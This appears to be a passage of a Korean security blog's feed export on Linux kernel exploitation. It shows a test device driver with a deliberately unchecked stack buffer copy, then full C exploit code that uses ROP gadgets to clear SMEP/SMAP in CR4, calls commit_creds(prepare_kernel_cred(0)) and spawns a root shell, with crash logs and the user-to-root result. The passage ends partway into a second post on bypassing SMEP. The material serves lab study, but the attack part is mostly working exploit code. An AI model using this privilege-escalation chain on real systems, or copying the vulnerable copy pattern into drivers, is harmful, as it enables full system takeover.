분석</h2><h3 id="디바이스-드라이버-소스코드"><a href="#디바이스-드라이버-소스코드" class="headerlink" title="디바이스 드라이버 소스코드"></a>디바이스 드라이버 소스코드</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;linux/input.h&gt;<br>#include &lt;linux/module.h&gt;<br>#include &lt;linux/init.h&gt;<br>#include &lt;linux/kernel.h&gt;<br>#include &lt;linux/miscdevice.h&gt;<br>#include &lt;linux/device.h&gt;<br>#include &lt;linux/slab.h&gt;<br>#include &lt;linux/uaccess.h&gt;<br>#include &lt;linux/string.h&gt;<br><br>MODULE_LICENSE(&quot;Dual BSD/GPL&quot;);<br>MODULE_AUTHOR(&quot;SAMPLE&quot;);<br><br>static ssize_t test_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos);<br><br>struct file_operations test_fops = &#123;<br>    .write  = test_write,<br>&#125;;<br><br>static struct miscdevice test_driver = &#123;<br>    .minor = MISC_DYNAMIC_MINOR,<br>    .name = &quot;test&quot;,<br>    .fops = &amp;test_fops,<br>&#125;;<br><br>static ssize_t test_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos) &#123;<br>    char arr[8] = &#123; [0 ... 7] = 0 &#125;;<br>    char *ptr;<br><br>    ptr = (char *)kmalloc(count, GFP_KERNEL);<br><br>    copy_from_user(ptr, buf, count);<br>    memcpy(arr, ptr, count);<br>    <br>    printk(&quot;arr : %x&quot;, arr[count-1]);  // prevent undefined behavior<br><br>    return 0;<br>&#125;<br><br><br>static int test_init(void) &#123;<br>    int result;<br><br>    result = misc_register(&amp;test_driver);<br><br>    return 0;<br>&#125;<br><br>static void test_exit(void) &#123;<br>    misc_deregister(&amp;test_driver);<br>&#125;<br><br>module_init(test_init);<br>module_exit(test_exit);<br></code></pre></td></tr></table></figure><p>해당 소스코드의 경우 공격 벡터(attack vector)가 될 수 있는 디바이스 드라이버 파일의 소스코드이다. 소스코드를 확인해볼 경우 file_operations 구조체 내부에서 write 시스템 콜에 대응하는 동작들을 정의하고 있다.</p><p>디바이스 드라이버 파일을 토대로 write 시스템 콜을 호출하게 될 경우 test_write() 함수가 실행된다. 해당 함수가 실행될 경우 line30~line33에 의하여 커널에서 메모리를 동적할당한 후 유저영역에서의 메모리를 해당 데이터의 크기만큼 복사하는 것을 확인할 수 있다.</p><p>이를 고려해보면 사용자가 입력한 데이터(untrusted input)의 크기를 제한하지 않는 문제로 인해서 스택 버퍼기반의 오버플로우가 발생할 것으로 예상된다.</p><p></br></br></p><h2 id="취약점-분석"><a href="#취약점-분석" class="headerlink" title="취약점 분석"></a>취약점 분석</h2><p><b>바이너리 분석</b>에서 사용자의 입력으로 부터 실행흐름을 변조할 가능성이 있음을 확인하였다. 해당 디바이스 드라이버를 토대로 write 시스템 콜이 호출되게 될 경우 디바이스 드라이버의 경우 사용자의 입력(untrusted input)이 버퍼 오버플로우를 발생시키기 때문이다. 예상한 결과가 맞는가에 대해서 확인해볼 필요가 있다.</p></br><h3 id="공격-코드"><a href="#공격-코드" class="headerlink" title="공격 코드"></a>공격 코드</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/stat.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdint.h&gt;<br><br><br>int main() &#123;<br>    int fd;<br>    size_t payload[18] = &#123;0, &#125;;<br>    <br><br>    fd = open(&quot;/dev/test&quot;, O_RDWR);<br><br><br>    memset(payload, 0x41, 40);<br>    payload[4] = 0x4343434343434343;   <br><br><br>    write(fd, payload, sizeof(payload));<br><br>    close(fd);<br><br>    return 0;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>디바이스 드라이버를 제어하는 코드를 작성하였다. 버퍼에 데이터를 어느정도 작성해야 Return Address를 컨트롤 할 수 있는가를 파악하기 위해서 연속적인 형태의 입력인 “AAA…ACCC…C…”를 입력하였다. 만약 RIP가 해당 입력값 중 하나의 값으로 변조된다면 이는 사용자의 입력으로 실행흐름을 변조할 수 있는 취약점으로 볼 수 있다. 참고로 스택 카나리는 비활성화 상태이다.</p></br><h3 id="공격-결과"><a href="#공격-결과" class="headerlink" title="공격 결과"></a>공격 결과</h3><pre><code>qemu-system-x86_64: warning: TCG doesn&#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5]/ $ ./crash [    5.845709] arr : 0[    5.847836] general protection fault: 0000 [#1] SMP NOPTI[    5.850227] CPU: 0 PID: 69 Comm: crash Tainted: G           O      5.8.5 #1[    5.851984] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014[    5.854040] RIP: 0010:0x4343434343434343[    5.854920] Code: Bad RIP value.[    5.855637] RSP: 0018:ffffc9000019fed8 EFLAGS: 00000246[    5.859450] RAX: 0000000000000000 RBX: 4141414141414141 RCX: 0000000020727261[    5.859996] RDX: 4141414141414141 RSI: ffffffff82b2bba0 RDI: ffffffff82b2bfa0[    5.860456] RBP: 4141414141414141 R08: 0000000030203a20 R09: 0000000000000007[    5.862713] R10: 0000000000000045 R11: ffffffff82b2bba7 R12: 4141414141414141[    5.863229] R13: 0000000000000090 R14: ffffc9000019ff10 R15: 00007fff25db9ea0[    5.863786] FS:  00000000011ce880(0000) GS:ffff88801f000000(0000) knlGS:0000000000000000[    5.864440] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033[    5.865603] CR2: 0000000000459f70 CR3: 000000001da40000 CR4: 00000000003006f0[    5.866234] Call Trace:[    5.867406]  ? do_syscall_64+0x3e/0x70[    5.868196]  ? entry_SYSCALL_64_after_hwframe+0x44/0xa9[    5.869328] Modules linked in: test(O)[    5.870959] ---[ end trace 0fcca97aa748deff ]---[    5.871920] RIP: 0010:0x4343434343434343[    5.872678] Code: Bad RIP value.[    5.873270] RSP: 0018:ffffc9000019fed8 EFLAGS: 00000246[    5.873831] RAX: 0000000000000000 RBX: 4141414141414141 RCX: 0000000020727261[    5.874345] RDX: 4141414141414141 RSI: ffffffff82b2bba0 RDI: ffffffff82b2bfa0[    5.874894] RBP: 4141414141414141 R08: 0000000030203a20 R09: 0000000000000007[    5.875395] R10: 0000000000000045 R11: ffffffff82b2bba7 R12: 4141414141414141[    5.875932] R13: 0000000000000090 R14: ffffc9000019ff10 R15: 00007fff25db9ea0[    5.876434] FS:  00000000011ce880(0000) GS:ffff88801f000000(0000) knlGS:0000000000000000[    5.877037] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033[    5.877708] CR2: 0000000000459f70 CR3: 000000001da40000 CR4: 00000000003006f0[    5.878296] Kernel panic - not syncing: Fatal exception[    5.879164] Kernel Offset: disabled[    5.879860] Rebooting in 1 seconds..qemu-system-x86_64: Trying to execute code outside RAM or ROM at 0x0000000081400220This usually means one of the following happened:(1) You told QEMU to execute a kernel for the wrong machine type, and it crashed on startup (eg trying to run a raspberry pi kernel on a versatilepb QEMU machine)(2) You didn&#39;t give QEMU a kernel or BIOS filename at all, and QEMU executed a ROM full of no-op instructions until it fell off the end(3) Your guest kernel has a bug and crashed by jumping off into nowhereThis is almost always one of the first two, so check your command line and that you are using the right type of kernel for this machine.If you think option (3) is likely then you can try debugging your guest with the -d debug options; in particular -d guest_errors will cause the log to include a dump of the guest register state at this point.Execution cannot continue; stopping here.해당 결과를 통해 RIP가 0x4343434343434343로 변조되었음을 확인할 수 있었고 해당 값은 사용자가 입력할 버퍼의 32만큼의 입력한 뒤의 값이다. 그러므로 payload[4]에 값을 작성할 경우 해당 값으로 실행흐름을 변조할 수 있다.</code></pre><p>공격결과는 예상하였던 것과 같이 실행흐름을 변조할 수 있음으로 파악된다. 해당 부분에서 추가적으로 확인할 수 있는 것은 <b>CR4 레지스터의 값</b>이다. 해당 값의 경우는 <b>0x00000000003006f0</b>으로 이를 바이너리 형태로 변경한다면 <b>00000000 00000000 00000000 00000000 00000000 00110000 00000110 11110000</b> 다음과 같다. 해당 결과를 해석해볼 경우 SMEP과 SMAP이 적용되어 있는 것을 확인할 수 있다.</p><p></br></br></p><h2 id="취약점-공격"><a href="#취약점-공격" class="headerlink" title="취약점 공격"></a>취약점 공격</h2><p>분석과정을 통해 사용자의 입력(untrusted input)을 통해 실행흐름을 변조할 수 있음을 확인하였다. 이러한 정보들을 토대로 공격자에게 유의미한 형태의 공격이 될 수 있도록 어떠한 형태로 공격을 진행할 것인가에 대해서 시나리오를 작성하겠다.</p><p>가장 파급력있고 공격자에게 자유도가 높은 방법은 리눅스(linux) 기반의 커널을 공격하는 것이기에 루트 권한의 쉘(shell)을 획득하는 것으로 볼 수 있다. 다음과 같은 공격이 이루어지기 위해서는 우선적으로 진행되어야 하는 것이 유저 권한을 루트 권한으로 상승(권한 상승)을 일으켜야 한다. </p></br><h3 id="공격-시나리오"><a href="#공격-시나리오" class="headerlink" title="공격 시나리오"></a>공격 시나리오</h3><pre><code>STEP1. CR4 레지스터 변조를 통한 SMEP, SMAP 비활성화STEP2. commit_creds(prepare_kernel_cred(0))을 통한 권한 상승STEP3. 사용자 모드(user mode)로의 전환STEP4. shell 획득</code></pre><p>다음의 시나리오는 SMEP, SMAP이 적용되어 있지 않은 일반적인 형태의 공격(exploit)과 유사하다. Memory Randomization이 적용되어 있지 않기 때문에 실행시키고자 하는 함수인 commit_creds(), prepare_kernel_cred()를 하드코딩하여 값을 작성해도 된다.</p><p>여기서 고려해야하는 사항은 이전 포스트에서 작성하였던 공격 시나리오의 경우 유저 영역의 함수에서 STEP2, STEP3, STEP4를 진행한다. 하지만 SMEP, SMAP이 적용되어 있기 때문에 STEP1의 과정을 거치지 않는다면 문제가 발생할 것이다.</p></br><h3 id="공격-코드-1"><a href="#공격-코드-1" class="headerlink" title="공격 코드(1)"></a>공격 코드(1)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/stat.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdint.h&gt;<br><br>unsigned long __attribute__((regparm(3))) (*commit_creds)(unsigned long cred);<br>unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred);<br><br>struct register_val &#123;<br>    uint64_t user_rip;<br>    uint64_t user_cs;<br>    uint64_t user_rflags;<br>    uint64_t user_rsp;<br>    uint64_t user_ss;<br>&#125; __attribute__((packed));<br><br>struct register_val rv;<br><br>void shell() &#123;<br>    execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL);<br>&#125;<br><br>void backup_rv(void) &#123;<br>    asm(&quot;mov rv+8, cs;&quot;<br>        &quot;pushf; pop rv+16;&quot;<br>        &quot;mov rv+24, rsp;&quot;<br>        &quot;mov rv+32, ss;&quot;<br>       );<br>    rv.user_rip = &amp;shell;<br>&#125;<br><br>void payload(void) &#123;<br>    commit_creds(prepare_kernel_cred(0));<br>    asm(&quot;swapgs;&quot;<br>        &quot;mov %%rsp, %0;&quot;<br>        &quot;iretq;&quot;<br>        : : &quot;r&quot; (&amp;rv));<br>&#125;<br><br>int main() &#123;<br>    int fd;<br>    size_t rop[10] = &#123;0, &#125;;<br>    <br>    commit_creds = 0xffffffff8108bed0;<br>    prepare_kernel_cred = 0xffffffff8108c2f0;<br><br>    fd = open(&quot;/dev/test&quot;, O_RDWR);<br><br>    backup_rv();<br><br>    memset(rop, 0x41, 40);<br>    rop[4] = &amp;payload;<br><br>    write(fd, rop, sizeof(rop));<br><br>    close(fd);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure></br><h3 id="공격-결과-1"><a href="#공격-결과-1" class="headerlink" title="공격 결과(1)"></a>공격 결과(1)</h3><pre><code>qemu-system-x86_64: warning: TCG doesn&#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5]/ $ ./exploit [    5.284800] arr : 0[    5.285076] unable to execute userspace code (SMEP?) (uid: 1000)[    5.287133] BUG: unable to handle page fault for address: 0000000000400bc4[    5.290793] #PF: supervisor instruction fetch in kernel mode[    5.291958] #PF: error_code(0x0011) - permissions violation[    5.293203] PGD 1d954067 P4D 1d954067 PUD 1d955067 PMD 1d952067 PTE 1e0ef025[    5.294763] Oops: 0011 [#1] SMP NOPTI[    5.295289] CPU: 0 PID: 70 Comm: exploit Tainted: G           O      5.8.5 #2[    5.295987] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014[    5.296780] RIP: 0010:0x400bc4[    5.297402] Code: Bad RIP value.[    5.297736] RSP: 0018:ffffc9000019fed8 EFLAGS: 00000246[    5.298131] RAX: 0000000000000000 RBX: 4141414141414141 RCX: 0000000020727261[    5.298608] RDX: 4141414141414141 RSI: ffffffff82b12ba0 RDI: ffffffff82b12fa0[    5.299073] RBP: 4141414141414141 R08: 0000000030203a20 R09: 0000000000028900[    5.299522] R10: 4141414141414141 R11: 0000000000000046 R12: 4141414141414141[    5.299982] R13: ffffc9000019ff10 R14: 00007fff8ce65780 R15: 0000000000000000[    5.300503] FS:  0000000001a2f880(0000) GS:ffff88801f200000(0000) knlGS:0000000000000000[    5.301110] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033[    5.301557] CR2: 0000000000400bc4 CR3: 000000001d970000 CR4: 00000000003006f0[    5.302173] Call Trace:[    5.303023]  ? ksys_write+0x9c/0xd0[    5.308759]  ? do_syscall_64+0x3e/0x70[    5.309125]  ? entry_SYSCALL_64_after_hwframe+0x44/0xa9[    5.310466] Modules linked in: test(O)[    5.312506] CR2: 0000000000400bc4[    5.313227] ---[ end trace c3b44d8ed90feeeb ]---[    5.314069] RIP: 0010:0x400bc4[    5.314341] Code: Bad RIP value.[    5.314574] RSP: 0018:ffffc9000019fed8 EFLAGS: 00000246[    5.314908] RAX: 0000000000000000 RBX: 4141414141414141 RCX: 0000000020727261[    5.316170] RDX: 4141414141414141 RSI: ffffffff82b12ba0 RDI: ffffffff82b12fa0[    5.316755] RBP: 4141414141414141 R08: 0000000030203a20 R09: 0000000000028900[    5.317232] R10: 4141414141414141 R11: 0000000000000046 R12: 4141414141414141[    5.317685] R13: ffffc9000019ff10 R14: 00007fff8ce65780 R15: 0000000000000000[    5.318159] FS:  0000000001a2f880(0000) GS:ffff88801f200000(0000) knlGS:0000000000000000[    5.318700] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033[    5.319070] CR2: 0000000000400bc4 CR3: 000000001d970000 CR4: 00000000003006f0[    5.319614] Kernel panic - not syncing: Fatal exception[    5.320346] Kernel Offset: disabled[    5.321058] Rebooting in 1 seconds..qemu-system-x86_64: Trying to execute code outside RAM or ROM at 0x00000000813f0950This usually means one of the following happened:(1) You told QEMU to execute a kernel for the wrong machine type, and it crashed on startup (eg trying to run a raspberry pi kernel on a versatilepb QEMU machine)(2) You didn&#39;t give QEMU a kernel or BIOS filename at all, and QEMU executed a ROM full of no-op instructions until it fell off the end(3) Your guest kernel has a bug and crashed by jumping off into nowhereThis is almost always one of the first two, so check your command line and that you are using the right type of kernel for this machine.If you think option (3) is likely then you can try debugging your guest with the -d debug options; in particular -d guest_errors will cause the log to include a dump of the guest register state at this point.Execution cannot continue; stopping here.</code></pre><p>공격 결과(1)을 통해 다음과 같은 방법으로는 익스플로잇이 가능하지 않음을 알 수 있다. 이를 고려하여 CR4 레지스터를 변조하여 SMEP과 SMAP을 비활성화하여 공격을 진행할 수 있다. CR4 레지스터를 변조할 수 있는 가젯(gadget)을 찾아 페이로드를 구성하여 보겠다.</p></br><h3 id="가젯-구성"><a href="#가젯-구성" class="headerlink" title="가젯 구성"></a>가젯 구성</h3><p>CR4 레지스터를 변조하기 위해서 필요한 가젯을 찾아봐야 한다. 사용자가 입력한 값으로 CR4 레지스터를 변조해야하며 현재 사용자의 입력이 위치하는 메모리는 스택으로 볼 수 있다. 이러한 것들을 고려하여 페이로드를 구상해보겠다.</p></br><pre><code>pop registermov cr4, register&amp;payload</code></pre><p>스택에 사용자가 입력한 데이터가 위치하며 이를 특정 레지스터에 담을 수 있는 가젯을 찾아 이를 cr4 레지스터에 위치하도록 해야한다. 이후 실행흐름을 유저영역의 함수로 변조한다면 정상적으로 코드가 실행되어 권한이 상승된 형태로 쉘을 획득할 수 있을 것으로 판단된다.</p></br><h3 id="가젯-추출"><a href="#가젯-추출" class="headerlink" title="가젯 추출"></a>가젯 추출</h3><pre><code>$ ROPgadget --binary vmlinux | grep &#39;mov cr4&#39;0xffffffff8102f82c : add byte ptr [rax], al ; add byte ptr [rax], al ; xor esi, esi ; mov cr4, rdi ; jmp 0xffffffff8102f8540xffffffff8104c097 : add byte ptr [rax], al ; mov cr4, rax ; jmp 0xffffffff8104c09e0xffffffff8102f82e : add byte ptr [rax], al ; xor esi, esi ; mov cr4, rdi ; jmp 0xffffffff8102f8540xffffffff8104c095 : add byte ptr [rax], dl ; add byte ptr [rax], al ; mov cr4, rax ; jmp 0xffffffff8104c09e0xffffffff8104c099 : mov cr4, rax ; jmp 0xffffffff8104c09e0xffffffff810973c0 : mov cr4, rax ; ret0xffffffff8102f832 : mov cr4, rdi ; jmp 0xffffffff8102f8540xffffffff810973bf : nop ; mov cr4, rax ; ret0xffffffff8104c094 : or eax, 0x1000 ; mov cr4, rax ; jmp 0xffffffff8104c09e0xffffffff8102f830 : xor esi, esi ; mov cr4, rdi ; jmp 0xffffffff8102f854 </code></pre></br><pre><code>$ objdump -M intel -d vmlinux | grep -a1 &quot;pop    rax&quot;ffffffff8197ee5a:    58                       pop    raxffffffff8197ee5b:    c3                       ret  </code></pre><p>다음과 같은 형태로 vmlinux에서 공격 페이로드를 구성할 가젯을 추출할 수 있었다. 사용자의 입력을 통해 스택에 있는 값을 컨트롤 할 수 있으며 pop 명령어를 통해서 rax에 해당 값을 담는다. 이후 mov cr4, rax를 통해서 rax의 값을 cr4 레지스터에 세팅한다. 이러한 과정이 수행될 경우 SMEP, SMAP을 비활성화된 형태의 state가 되므로 유저 영역의 함수를 실행할 수 있게 된다.</p></br><h3 id="공격코드-2"><a href="#공격코드-2" class="headerlink" title="공격코드(2)"></a>공격코드(2)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/stat.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdint.h&gt;<br><br>unsigned long __attribute__((regparm(3))) (*commit_creds)(unsigned long cred);<br>unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred);<br><br>struct register_val &#123;<br>    uint64_t user_rip;<br>    uint64_t user_cs;<br>    uint64_t user_rflags;<br>    uint64_t user_rsp;<br>    uint64_t user_ss;<br>&#125; __attribute__((packed));<br><br>struct register_val rv;<br><br>void shell() &#123;<br>    execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL);<br>&#125;<br><br>void backup_rv(void) &#123;<br>    asm(&quot;mov rv+8, cs;&quot;<br>        &quot;pushf; pop rv+16;&quot;<br>        &quot;mov rv+24, rsp;&quot;<br>        &quot;mov rv+32, ss;&quot;<br>       );<br>    rv.user_rip = &amp;shell;<br>&#125;<br><br>void payload(void) &#123;<br>    commit_creds(prepare_kernel_cred(0));<br>    asm(&quot;swapgs;&quot;<br>        &quot;mov %%rsp, %0;&quot;<br>        &quot;iretq;&quot;<br>        : : &quot;r&quot; (&amp;rv));<br>&#125;<br><br>int main() &#123;<br>    int fd;<br>    size_t rop[10] = &#123;0, &#125;;<br>    <br>    commit_creds = 0xffffffff8108bed0;<br>    prepare_kernel_cred = 0xffffffff8108c2f0;<br><br>    fd = open(&quot;/dev/test&quot;, O_RDWR);<br><br>    backup_rv();<br><br>    memset(rop, 0x41, 40);<br>    rop[4] = 0xffffffff8197ee5a;     // pop rax; ret;<br>    rop[5] = 0x0006f0;               // SMAP: Disabled | SMEP: Disabled <br>    rop[6] = 0xffffffff810973c0;     // mov cr4, rax; ret;<br>    rop[7] = &amp;payload;<br><br>    write(fd, rop, sizeof(rop));<br><br>    close(fd);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure></br><h3 id="공격결과-2"><a href="#공격결과-2" class="headerlink" title="공격결과(2)"></a>공격결과(2)</h3><pre><code>qemu-system-x86_64: warning: TCG doesn&#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5]/ $ whoamiuser/ $ ./exploit / # whoamiroot/ # </code></pre><p></br></br></p><h2 id="참고"><a href="#참고" class="headerlink" title="참고"></a>참고</h2><pre><code>b30w0lf님의 운영체제(Operating System)DREAMHACK - Linux Kernel ExploitINFLEARN - 리눅스 커널 해킹. A부터 Z까지https://www.lazenca.net/pages/viewpage.action?pageId=25624859https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame</code></pre><p></br></br></p><h2 id="한줄평"><a href="#한줄평" class="headerlink" title="한줄평"></a>한줄평</h2><pre><code>크래시가 발생한 메모리의 상황에 따라 적절히 페이로드로 구성할 수 있도록 고민하자.</code></pre>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>exploit</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>mitigation</tag>
      
      <tag>smap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Linux Kernel Exploit - Bypassing SMEP</title>
    <link href="/2021/09/30/linux-kernel-exploit-bypassing-smep/"/>
    <url>/2021/09/30/linux-kernel-exploit-bypassing-smep/</url>
    
    <content type="html"><![CDATA[<h2 id="Research-Linux-Kernel-Exploit-Bypassing-SMEP"><a href="#Research-Linux-Kernel-Exploit-Bypassing-SMEP" class="headerlink" title="[Research] Linux Kernel Exploit - Bypassing SMEP"></a>[Research] Linux Kernel Exploit - Bypassing SMEP</h2><p><img src="/img/penguinshot.png"></p><h2 id="서론"><a href="#서론" class="headerlink" title="서론"></a>서론</h2><p>해당 포스트에서는 Linux Kernel Basic 시리즈의 정보를 기반으로 하여 리눅스 커널에 적용되어 있는 보호기법(mitigation)을 하나씩 우회하여 공격하는 과정을 포스트하려고 한다. 해당 포스트에서는 SMEP 보호기법을 주제로 하여 해당 보호기법이 어떠한 보호기법인지 이해하고 이를 우회하여 공격하는 방법을 작성하려고 한다.</p></br></br><h2 id="SMEP"><a href="#SMEP" class="headerlink" title="SMEP"></a>SMEP</h2><p>SMEP(Supervisor Mode Execution Prevention)은 supervisor mode(ring0)에서 특정 주소에 있는 명령어를 fetch할 경우 해당 주소가 만약 user mode(ring3)에서 접근가능한 주소라면 fetch하지 않게 하는 보호기법이다. </p><p>단순한 정의를 내리는 것에 갇히지 않고 내가 이해한 내용으로 해당 기법을 작성하면 SMEP은 유저영역에 NX bit와 유사하다는 느낌이 들었다. 지난 포스팅에서는 페이로드가 디바이스 드라이버를 제어하는 코드에 있었다. SMEP이 적용되어 있다면 다음과 같은 형태의 공격은 불가능하다. </p><pre><code>qemu-system-x86_64: warning: TCG doesn&#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5]/ $ lsbin      etc      init     linuxrc  root     sys      tmpdev      exp      lib      proc     sbin     test.ko  usr/ $ ./exp [    4.728265] unable to execute userspace code (SMEP?) (uid: 1000)[    4.729769] BUG: unable to handle page fault for address: 0000000000400c54[    4.733079] #PF: supervisor instruction fetch in kernel mode[    4.734208] #PF: error_code(0x0011) - permissions violation[    4.735407] PGD 1d954067 P4D 1d954067 PUD 1d958067 PMD 1d94c067 PTE 1dc30025[    4.737038] Oops: 0011 [#1] SMP NOPTI[    4.738022] CPU: 0 PID: 70 Comm: exp Tainted: G           O      5.8.5 #1[    4.738838] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014[    4.739732] RIP: 0010:0x400c54[    4.740234] Code: Bad RIP value.[    4.740527] RSP: 0018:ffffc9000019feb8 EFLAGS: 00000246[    4.740937] RAX: 0000000000400c54 RBX: 0000000000000008 RCX: 0000000000000000[    4.741387] RDX: 0000000000000000 RSI: 00007ffe415d0348 RDI: ffffc9000019fec8[    4.741846] RBP: ffff88801d91e900 R08: 0000000000400c54 R09: 0000000000000000[    4.742300] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000[    4.742802] R13: 0000000000000008 R14: ffffc9000019ff10 R15: 00007ffe415d0340[    4.743299] FS:  00000000018a3880(0000) GS:ffff88801f200000(0000) knlGS:0000000000000000[    4.743928] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033[    4.744355] CR2: 0000000000400c54 